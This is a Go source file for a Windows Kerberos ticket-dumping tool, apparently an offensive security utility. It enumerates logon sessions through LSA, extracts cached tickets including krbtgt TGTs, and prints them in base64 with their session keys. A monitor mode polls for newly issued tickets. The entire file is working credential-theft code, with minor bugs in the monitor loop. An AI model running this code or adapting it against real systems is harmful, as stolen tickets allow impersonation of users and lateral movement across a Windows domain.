package main


import (
	"fmt"
	"log"
	"math"
	"os"
	"flag"
	"syscall"
	"unsafe"
	"time"

	"strings"
	"github.com/carlpett/winlsa"
	"github.com/carlpett/winlsa/internal/lsa"
	"github.com/taskcluster/runlib/win32"
	"golang.org/x/sys/windows"
	"encoding/base64"

)

const (
	STATUS_SUCCESS                      uint32 = uint32(windows.STATUS_SUCCESS)
	DEFAULT_AUTH_PKG_ID                 uint32 = math.MaxUint32
	MICROSOFT_KERBEROS_NAME_A           string = "kerberos"
	KERB_RETRIEVE_TICKET_DEFAULT        uint32 = 0x0
	KERB_RETRIEVE_TICKET_DONT_USE_CACHE uint32 = 0x1
	KERB_RETRIEVE_TICKET_AS_KERB_CRED   uint32 = 0x8
	KerbRetrieveEncodedTicketMessage    uint32 = 8
	KerbForwardable                     uint32 = 1073741824
	KerbForwarded                       uint32 = 536870912
	KerbRenewable                       uint32 = 8388608
	KerbPre_authent                     uint32 = 2097152
	ticketFlags                         uint32 = KerbForwardable | KerbForwarded | KerbRenewable | KerbPre_authent
)

func main() {
		asciiArt := `
     _   __          _                                _   
    | | / /         | |                              | |  
    | |/ /  ___ _ __| |__   ___  __ _  ___   __ _ ___| |_ 
    |    \ / _ \ '__| '_ \ / _ \/ _` + "`" + ` |/ _ \ / _` + "`" + ` / __| __|
    | |\  \  __/ |  | |_) |  __/ (_| | (_) | (_| \__ \ |_ 
    \_| \_/\___|_|  |_.__/ \___|\__, |\___/ \__,_|___/\__|
                                 __/ |                    
                                |___/                     
By Serizao @BZHunt   
 `
	fmt.Println(asciiArt)
	OnlyKrbtgt := flag.Bool("krbtgt", false, "Display only krbtgt")
	Monitor    := flag.Int("monitor", 0, "Monitor new ticket")
	flag.Parse()
	if *Monitor == 0 {
		all := TicketExtract()
		DisplayResult(all,*OnlyKrbtgt)
	}
	if *Monitor > 0 {
		allOld := TicketExtract()
		for {
			time.Sleep( time.Duration(*Monitor) * time.Second)
			all := TicketExtract()
			DisplayNewResult(allOld,all,*OnlyKrbtgt)
			all=allOld
		}
		
	}
}


func TicketExtract() []lsa.DisplaySession {	
	all := []lsa.DisplaySession{}
	h := syscall.Handle(0)
	err := win32.LsaConnectUntrusted(&h)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("Handle: %v", h)
	authPackage := uint32(0)
	err = win32.LsaLookupAuthenticationPackage(h, &win32.MICROSOFT_KERBEROS_NAME_A, &authPackage)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("Auth package: %v", authPackage)

	luids, err := winlsa.GetLogonSessions()
	if err != nil {
		fmt.Println("GetLogonSessions:", err)
		os.Exit(1)
	}

	for _, luid := range luids {

		sd, err := winlsa.GetLogonSessionData(&luid)
		if err != nil {
			fmt.Println("LsaGetLogonSessionData:", err)
			os.Exit(1)
		}

		krbTmp := make([]byte, int(unsafe.Sizeof(lsa.KERB_QUERY_TKT_CACHE_REQUEST{})))

		siz := uint32(unsafe.Sizeof(lsa.KERB_QUERY_TKT_CACHE_REQUEST{}))

		ticketCacheRequest := (*lsa.KERB_QUERY_TKT_CACHE_REQUEST)(unsafe.Pointer(&krbTmp[0]))
		ticketCacheRequest.MessageType = lsa.KerbQueryTicketCacheExMessage
		ticketCacheRequest.LogonId = sd.LogonId
		protocolSubmitBuffer := uintptr(unsafe.Pointer(ticketCacheRequest))

		responseLenTemp := uint32(math.MaxUint32 - 20000)
		var responseLen = &responseLenTemp
		var protocolReturnBuffer uintptr
		var protocolStatus windows.NTStatus

		
		_, NTStatus := lsa.LsaCallAuthenticationPackage(h, authPackage, protocolSubmitBuffer, siz, &protocolReturnBuffer, &responseLen, &protocolStatus)
		if NTStatus == STATUS_SUCCESS && 0 != protocolReturnBuffer {

			var ticketCacheResponse lsa.KERB_QUERY_TKT_CACHE_RESPONSE
			ticketCacheResponse = *(*lsa.KERB_QUERY_TKT_CACHE_RESPONSE)(unsafe.Pointer(protocolReturnBuffer))
			count2 := ticketCacheResponse.CountOfTickets

			if count2 != 0 {
				session := lsa.DisplaySession{
					UserName: 			   fmt.Sprintf("%s",sd.UserName),
					LogonDomain:  		   fmt.Sprintf("%s",sd.LogonDomain),
					LogonId:  		       fmt.Sprintf("%s",sd.LogonId),
					Sid:             	   fmt.Sprintf("%s",sd.Sid),
					AuthenticationPackage: fmt.Sprintf("%s",sd.AuthenticationPackage),
					LogonType:             fmt.Sprintf("%s",sd.LogonType),
					LogonTime:             fmt.Sprintf("%s",sd.LogonTime),
					LogonServer:           fmt.Sprintf("%s",sd.LogonServer),
					DnsDomainName:         fmt.Sprintf("%s",sd.DnsDomainName),
					Upn:          		   fmt.Sprintf("%s",sd.Upn),
					CountOfTickets:        int(ticketCacheResponse.CountOfTickets),
				}
				dataSize := unsafe.Sizeof(lsa.KERB_TICKET_CACHE_INFO_EX{})
				RealCount :=0
				for j := 0; j < int(count2); j++ {
					PtrTicket := uintptr(protocolReturnBuffer) + uintptr(8+j*int(dataSize))
					TempTicket := (*lsa.KERB_TICKET_CACHE_INFO_EX)(unsafe.Pointer(PtrTicket))
					if TempTicket.ServerRealm.String() != "" && TempTicket.ServerName.String() != "" {
						RealCount++
						tempTick,state := Extract(h,authPackage,sd.LogonId,TempTicket.ServerName.String(),TempTicket.TicketFlags)
						if state {
							session.TicketsStub = append(session.TicketsStub ,lsa.DisplayTicketStub{
								ServerName: 		TempTicket.ServerName.String(),
								ClientName:  		TempTicket.ClientName.String(),
								ClientRealm:  		TempTicket.ClientRealm.String(),
								ServerRealm:      	TempTicket.ServerRealm.String(),
								StartTime:          fmt.Sprintf("%s",fromFileTimeUtc(TempTicket.StartTime)),
								EndTime:  			fmt.Sprintf("%s",fromFileTimeUtc(TempTicket.EndTime)),
								RenewTime:          fmt.Sprintf("%s",fromFileTimeUtc(TempTicket.RenewTime)),
								TicketFlags:        strings.Join(lsa.DescribeFlagTicket(TempTicket.TicketFlags)," | "),
								Ticket:				tempTick,
							})
						}
					}
				}
				if RealCount > 0 {
					all = append(all,session)
				}
			}
			lsa.LsaFreeReturnBuffer(protocolReturnBuffer)
			lsa.LsaFreeReturnBuffer(protocolSubmitBuffer)
		}
	}
	return all
}
func DisplayResult(results []lsa.DisplaySession,krbtgtOnly bool) {
	var memSession string
	for _,session := range results {

		if len(session.TicketsStub) > 0 {
			krbVar := true
			if krbtgtOnly {
				krbVar = CheckKrbtgt(session.TicketsStub)
			}
			if memSession != session.LogonId && krbVar{
				fmt.Println("\n-----------------------------> "+session.UserName+"\n")
			    fmt.Printf("  Domain                   : %s\n", session.LogonDomain);
			    fmt.Printf("  LogonId                  : %s\n", session.LogonId);
			    fmt.Printf("  UserSID                  : %v\n", session.Sid);
			    fmt.Printf("  AuthenticationPackage    : %s\n", session.AuthenticationPackage);
			    fmt.Printf("  LogonType                : %s\n", session.LogonType);
			    fmt.Printf("  LogonTime                : %s\n", session.LogonTime);
			    fmt.Printf("  LogonServer              : %s\n", session.LogonServer);
			    fmt.Printf("  LogonServerDNSDomain     : %s\n", session.DnsDomainName);
			    fmt.Printf("  UserPrincipalName        : %s\n", session.Upn);
			    fmt.Printf("  Number of tickets        : %d\n", session.CountOfTickets)
			    memSession = session.LogonId
			}
			for _, ticket := range session.TicketsStub {
				if !krbtgtOnly || ticket.Ticket.ServiceName=="krbtgt" {
				    fmt.Printf("  	[i]  Server name :  %q \n", ticket.ServerName)
				    fmt.Printf("  	[i]  Service name:  %q \n", ticket.Ticket.ServiceName)
					fmt.Printf("  	[i]  Client name :  %q \n", ticket.Ticket.ClientName)
					fmt.Printf("  	[i]  ClientRealm :  %q \n", ticket.ClientRealm)
					fmt.Printf("  	[i]  ServerRealm :  %q \n", ticket.ServerRealm)
					fmt.Printf("  	[i]  StartTime   :  %q \n", ticket.Ticket.StartTime)
					fmt.Printf("  	[i]  EndTime     :  %q \n", ticket.Ticket.EndTime)
					fmt.Printf("  	[i]  RenewTime   :  %q \n", ticket.Ticket.RenewUntil)
					fmt.Printf("  	[i]  Flags       :  %q \n", ticket.Ticket.Flags)
					fmt.Printf("  	[i]  Ticket      :\n%s \n", ticket.Ticket.EncodedTicket)
					fmt.Println("\n")
				}
			}
		}
	}
}
func containNew(ticket string, old []lsa.DisplaySession) bool {
	for _,session := range old {
		for _, ticketOld := range session.TicketsStub {
			if ticketOld.Ticket.EncodedTicket == ticket {
				return false
			}
		}
	}
	return true
}

func DisplayNewResult(resultsOld []lsa.DisplaySession,results []lsa.DisplaySession,krbtgtOnly bool) {
	var memSession string
	for _,session := range results {

		if len(session.TicketsStub) > 0 {
			krbVar := true
			if krbtgtOnly {
				krbVar = CheckKrbtgt(session.TicketsStub)
			}
			for _, ticket := range session.TicketsStub {
				if (!krbtgtOnly || ticket.Ticket.ServiceName=="krbtgt") && containNew(ticket.Ticket.EncodedTicket,resultsOld) {
					if memSession != session.LogonId && krbVar{
						fmt.Println("\n-----------------------------> "+session.UserName+"\n")
					    fmt.Printf("  Domain                   : %s\n", session.LogonDomain);
					    fmt.Printf("  LogonId                  : %s\n", session.LogonId);
					    fmt.Printf("  UserSID                  : %v\n", session.Sid);
					    fmt.Printf("  AuthenticationPackage    : %s\n", session.AuthenticationPackage);
					    fmt.Printf("  LogonType                : %s\n", session.LogonType);
					    fmt.Printf("  LogonTime                : %s\n", session.LogonTime);
					    fmt.Printf("  LogonServer              : %s\n", session.LogonServer);
					    fmt.Printf("  LogonServerDNSDomain     : %s\n", session.DnsDomainName);
					    fmt.Printf("  UserPrincipalName        : %s\n", session.Upn);
					    fmt.Printf("  Number of tickets        : %d\n", session.CountOfTickets)
					    memSession = session.LogonId
					}
				    fmt.Printf("  	[i]  Server name :  %q \n", ticket.ServerName)
				    fmt.Printf("  	[i]  Service name:  %q \n", ticket.Ticket.ServiceName)
					fmt.Printf("  	[i]  Client name :  %q \n", ticket.Ticket.ClientName)
					fmt.Printf("  	[i]  ClientRealm :  %q \n", ticket.ClientRealm)
					fmt.Printf("  	[i]  ServerRealm :  %q \n", ticket.ServerRealm)
					fmt.Printf("  	[i]  StartTime   :  %q \n", ticket.Ticket.StartTime)
					fmt.Printf("  	[i]  EndTime     :  %q \n", ticket.Ticket.EndTime)
					fmt.Printf("  	[i]  RenewTime   :  %q \n", ticket.Ticket.RenewUntil)
					fmt.Printf("  	[i]  Flags       :  %q \n", ticket.Ticket.Flags)
					fmt.Printf("  	[i]  Ticket      :\n%s \n", ticket.Ticket.EncodedTicket)
					fmt.Println("\n")
				}
			}
		}
	}
}


func CheckKrbtgt(stub []lsa.DisplayTicketStub) bool {
	for _, ticket := range stub {
		if ticket.Ticket.ServiceName == "krbtgt"{
			return true
		}
	}
	return false
}
func fromFileTimeUtc(fileTime int64) time.Time {
	epochDiff := int64(11644473600)
	if fileTime < 0 || fileTime > 2650467743999999999 {
		return time.Time{}
	}

	// Convert to seconds by dividing by 1e7 (there are 1e7 100-nanosecond intervals per second)
	unixTime := (fileTime / 1e7) - epochDiff

	// Return as time.Time
	return time.Unix(unixTime, 0).UTC()
}

func Extract(lsaHandle syscall.Handle, authPack uint32, userLogonID windows.LUID, targetName string, ticketFlags uint32)(lsa.DisplayTicket,bool) {
	// Préparer la requête pour extraire le ticket
	TargetNamePtr := lsa.NewUnicodeString(targetName)
	request := lsa.KERB_RETRIEVE_TKT_REQUEST{
		MessageType:    lsa.KerbRetrieveEncodedTicketMessage,
		LogonId:        userLogonID,
		TargetName:     *TargetNamePtr,
		TicketFlags:    ticketFlags,
		CacheOptions:   KERB_RETRIEVE_TICKET_AS_KERB_CRED,
		EncryptionType: 0,
	}
	requestSize := uintptr(unsafe.Sizeof(request))
	//fmt.Println("Struct Size:", requestSize)

	newStructSize := requestSize + uintptr(TargetNamePtr.MaximumLength)

	// Allouer de la mémoire non gérée
	unmanagedAddr, err := lsa.HeapAlloc(lsa.GetProcessHeap(), 0, newStructSize)
	if unmanagedAddr == 0 || err != nil {
		log.Fatalf("HeapAlloc failed: %v", err)
	}

	// Copier la structure de la requête dans la mémoire non gérée
	CopyMemory(unsafe.Pointer(unmanagedAddr), unsafe.Pointer(&request), requestSize)

	// Définir le pointeur TargetName à la fin de KERB_RETRIEVE_TKT_REQUEST
	newTargetNameBuffPtr := unmanagedAddr + uintptr(requestSize)
	CopyMemory(unsafe.Pointer(newTargetNameBuffPtr), unsafe.Pointer(TargetNamePtr.Buffer), uintptr(TargetNamePtr.MaximumLength))

	// Mettre à jour le pointeur du buffer TargetName dans la mémoire non gérée
	if unsafe.Sizeof(uintptr(0)) == 8 {
		*(*uintptr)(unsafe.Pointer(unmanagedAddr + 24)) = newTargetNameBuffPtr
	} else {
		*(*uintptr)(unsafe.Pointer(unmanagedAddr + 16)) = newTargetNameBuffPtr
	}

	var returnBuffer uintptr
	var responseLen uint32
	var protocolStatus windows.NTStatus

	// Appeler LsaCallAuthenticationPackage pour extraire le ticket

	_, NTStatus := lsa.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, uint32(newStructSize), &returnBuffer, (**uint32)(unsafe.Pointer(&responseLen)), &protocolStatus)
	if NTStatus == STATUS_SUCCESS &&  0 != returnBuffer {

		// Convertir la réponse en structure KERB_RETRIEVE_TKT_RESPONSE
		var response lsa.KERB_RETRIEVE_TKT_RESPONSE
		response = *(*lsa.KERB_RETRIEVE_TKT_RESPONSE)(unsafe.Pointer(returnBuffer))

		encodedTicketSize := response.Ticket.EncodedTicketSize
		encodedTicket := make([]byte, encodedTicketSize)
		CopyMemory(unsafe.Pointer(&encodedTicket[0]), unsafe.Pointer(response.Ticket.EncodedTicket), uintptr(encodedTicketSize))
		encodedTicketBase64 := base64.StdEncoding.EncodeToString(encodedTicket)
		ticket := response.Ticket
		returnTicket := lsa.DisplayTicket {
			ServiceName: 		 ticket.ServiceName.String(),
			ClientName:  		 ticket.ClientName.String(),
			DomainName: 		 ticket.DomainName.String(),
			TargetDomainName:  	 ticket.TargetDomainName.String(),
			AltTargetDomainName: ticket.AltTargetDomainName.String(),
			SessionKey:   		 fmt.Sprintf("%x",response.Ticket.SessionKey.Key),
			TicketFlags:		 fmt.Sprintf("%s",ticket.TicketFlags),
			Flags:               strings.Join(lsa.DescribeFlagTicket(ticket.Flags),", "),
			KeyExpirationTime:   fmt.Sprintf("%s",fromFileTimeUtc(ticket.KeyExpirationTime)),
			StartTime:           fmt.Sprintf("%s",fromFileTimeUtc(ticket.StartTime)),
			EndTime:  			 fmt.Sprintf("%s",fromFileTimeUtc(ticket.EndTime)),
			RenewUntil:          fmt.Sprintf("%s",fromFileTimeUtc(ticket.RenewUntil)),
			TimeSkew:            fmt.Sprintf("%i",ticket.TimeSkew),
			EncodedTicket:       fmt.Sprintf("%s",encodedTicketBase64),
		}

		// Libérer la mémoire allouée par LsaCallAuthenticationPackage
		lsa.LsaFreeReturnBuffer(returnBuffer)
		lsa.HeapFree(lsa.GetProcessHeap(), 0, unmanagedAddr)
		return returnTicket,true
	} 
	return lsa.DisplayTicket{},false
}


func CopyMemory(dest, src unsafe.Pointer, length uintptr) {
	for i := uintptr(0); i < length; i++ {
		*(*byte)(unsafe.Pointer(uintptr(dest) + i)) = *(*byte)(unsafe.Pointer(uintptr(src) + i))
	}
}

